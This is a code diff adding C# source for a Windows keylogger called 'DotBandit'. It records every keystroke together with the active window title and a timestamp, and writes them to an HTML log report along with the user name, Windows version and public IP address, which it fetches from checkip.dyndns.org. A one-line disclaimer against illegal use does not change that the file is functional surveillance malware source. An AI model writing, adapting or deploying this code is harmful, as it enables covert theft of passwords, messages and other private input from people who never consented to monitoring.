@@ -1,0 +1,211 @@
+private static void write(string s)
+    {
+        writer.Write(s);
+
+        if (counter >= 1000)
+        {
+            writer.Close();
+            writer = new StreamWriter(path, true);
+            counter = 0;
+        }
+    }
+
+	private static string getCurrentWindowText()
+    {
+        IntPtr handle = GetForegroundWindow();
+        StringBuilder title = new StringBuilder(MAX_STRING_BUILDER);
+        GetWindowText(handle, title, MAX_STRING_BUILDER);
+        return title.ToString();
+    }
+
+	private static string getMyIPAddress()
+    {
+        string address = "";
+        WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
+        using (WebResponse response = request.GetResponse())
+        using (StreamReader stream = new StreamReader(response.GetResponseStream()))
+        {
+            address = stream.ReadToEnd();
+        }
+        int first = address.IndexOf("Address: ") + 9;
+        int last = address.IndexOf("</body>");
+        address = address.Substring(first, last - first);
+        return address;
+    }
+
+public static void ACTION()
+    {
+        //CREATE DIRECTORY UKP        
+        if (!System.IO.Directory.Exists(path))
+        {
+            System.IO.Directory.CreateDirectory(path);
+        }
+        path += "\\Session_" + DateTime.Now.ToString("MM.dd.yyyy HH.mm.ss") + "_.html";
+        //File.WriteAllText(path, string.Empty);
+
+        //WINDOWS IDENTITY
+        string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+
+        //KEYLOGGER
+        Keys key;
+        using (writer = new StreamWriter(path, true))
+        {
+            string lastWindowText = "";
+            string tempWindowText = "";
+
+            write("<!DOCTYPE html>" + Environment.NewLine);
+            write("<html lang='en'>" + Environment.NewLine);
+            write("    <head>" + Environment.NewLine);
+            write("        <!-- http://getbootstrap.com/ -->" + Environment.NewLine);
+            write("        <link href='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css' rel='stylesheet'/>" + Environment.NewLine);
+            write("        <meta charset='utf-8'/>" + Environment.NewLine);
+            write("        <meta content='initial-scale=1, width=device-width' name='viewport'/>" + Environment.NewLine);
+            write("        <meta http-equiv='X-UA-Compatible' content='IE=edge'/>" + Environment.NewLine);
+            write("        <title>DotBandit - Log Report</title>" + Environment.NewLine);
+            write("        <style>" + Environment.NewLine);
+            write("        table {font-family: Consolas, sans-serif;border-collapse: collapse;width: 100%;table-layout: fixed;}" + Environment.NewLine);
+            write("        td, th {border: 1px solid #dddddd;text-align: left;padding: 8px;overflow: auto; text-overflow: ellipsis; white-space: normal;}" + Environment.NewLine);
+            write("        tr:nth-child(even) {background-color: #dddddd;}" + Environment.NewLine);
+            write("        xmp{overflow: auto;text-overflow: ellipsis;white-space: normal;}" + Environment.NewLine);
+            write("        </style>" + Environment.NewLine);
+            write("    </head>" + Environment.NewLine);
+            write("    <body>" + Environment.NewLine);
+            write("        <div class='container'>" + Environment.NewLine);
+            write("            <div class='page-header'>" + Environment.NewLine);
+            write("                <h1>Log Report - " + DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss") + "</h1>" + Environment.NewLine);
+            write("                <p><h4><small>Report provided by DotBandit Beta 01 <br><a href='https://dotbandit.github.io/'>dotbandit.github.io</a></small></h4></p>" + Environment.NewLine);
+            write("            </div>" + Environment.NewLine);
+            write("            <p><h5 style='color:red'>Warning!</h5></p>" + Environment.NewLine);
+            write("              <p><h5>1. This HTML file should be viewed in your local browser to be properly presented.</h5></p>" + Environment.NewLine);
+            write("              <p><h5>2. Viewing this file without internet connection will prevent DotBandit from properly presenting this file.</h5></p>" + Environment.NewLine);
+            write("              <p><h5>3. This tool should not be used in ANY sort of illegal activity. Users of DotBandit ARE responsible for their actions.</h5></p><br><br>" + Environment.NewLine);
+            write("            <h4>Log created on: " + DateTime.Now.ToLongDateString() + " " + DateTime.Now.ToLongTimeString() + "</h4>" + Environment.NewLine);
+            write("            <h5>DotBandit is logged on: " + userName + "</h5>" + Environment.NewLine);
+            write("            <h5>Windows Version: " + Environment.OSVersion + "</h5>" + Environment.NewLine);
+            try
+            {
+                write("            <h5>Public IP Address: " + getMyIPAddress() + "</h5>" + Environment.NewLine);
+            }
+            catch (Exception ex) { }
+            write("            <table>" + Environment.NewLine);
+            write("              <tr>" + Environment.NewLine);
+            write("                <th width='420px'>Active window</th>" + Environment.NewLine);
+            write("                <th width='100px'>Time</th>" + Environment.NewLine);
+            write("                <th>Text written at active window</th>" + Environment.NewLine);
+            write("              </tr>" + Environment.NewLine);
+
+            while (true)
+            {
+                //MAYBE SLEEP 50
+                Thread.Sleep(35);
+                //Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.Idle;
+
+                for (Int32 i = 0; i < 1000; i++)
+                {
+                    tempWindowText = getCurrentWindowText();
+                    if (lastWindowText != tempWindowText)
+                    {
+                        lastWindowText = tempWindowText;
+                        write(Environment.NewLine +
+                            "                </xmp></td></tr>"
+                            + "<tr><td width='420px'><br><p style='color:green;'><b>" + lastWindowText + "</b></p></td>"
+                            + "<td width='100px'>" + DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss") + "</td>"
+                            + "<td><xmp>");
+                    }
+
+                    int value = GetAsyncKeyState(i);
+                    if ((value & 0x8000) == 0 || (value & 0x1) == 0)
+                        continue;
+                    key = (Keys)i;
+                    switch (key)
+                    {
+                        case Keys.Back:
+                            write("<Back>");
+                            break;
+                        case Keys.Enter:
+                            write("\n");
+                            break;
+                        case Keys.Space:
+                            write(" ");
+                            break;
+                        case Keys.Tab:
+                            write("\t");
+                            break;
+                        case Keys.ControlKey:
+                            write("<Ctrl>");
+                            break;
+                        case Keys.Alt:
+                            write("<Alt>");
+                            break;
+                        case Keys.F1:
+                            write("<F1>");
+                            break;
+                        case Keys.F2:
+                            write("<F2>");
+                            break;
+                        case Keys.F3:
+                            write("<F3>");
+                            break;
+                        case Keys.F4:
+                            write("<F4>");
+                            break;
+                        case Keys.F5:
+                            write("<F5>");
+                            break;
+                        case Keys.F6:
+                            write("<F6>");
+                            break;
+                        case Keys.F7:
+                            write("<F7>");
+                            break;
+                        case Keys.F8:
+                            write("<F8>");
+                            break;
+                        case Keys.F9:
+                            write("<F9>");
+                            break;
+                        case Keys.F10:
+                            write("<F10>");
+                            break;
+                        case Keys.F11:
+                            write("<F11>");
+                            break;
+                        case Keys.F12:
+                            write("<F12>");
+                            break;
+                        case Keys.LWin:
+                            writer.Write("<Win>");
+                            break;
+                        case Keys.RWin:
+                            writer.Write("<Win>");
+                            break;
+                        //case Keys.Escape:
+                            //if (DEBUG)
+                                //return;
+
+                        default:
+                            IntPtr hWindowHandle = GetForegroundWindow();
+                            uint dwProcessId;
+                            uint dwThreadId = GetWindowThreadProcessId(hWindowHandle, out dwProcessId);
+                            byte[] kState = new byte[256];
+                            GetKeyboardState(kState);
+                            uint HKL = GetKeyboardLayout(dwThreadId);
+                            StringBuilder keyName = new StringBuilder();
+                            ToUnicodeEx((uint)i, (uint)i, kState, keyName, 16, 0, HKL);
+                            write(keyName.ToString());
+                            break;
+                    }
+                }
+
+                #region Fix Cases
+                if (Control.ModifierKeys == (Keys.Control & Keys.C))
+                {
+                    /* ?? */
+                }
+                #endregion  
+
+                if (counter++ % 50 == 0)
+                    writer.Flush();
+            }
+        }
+    }
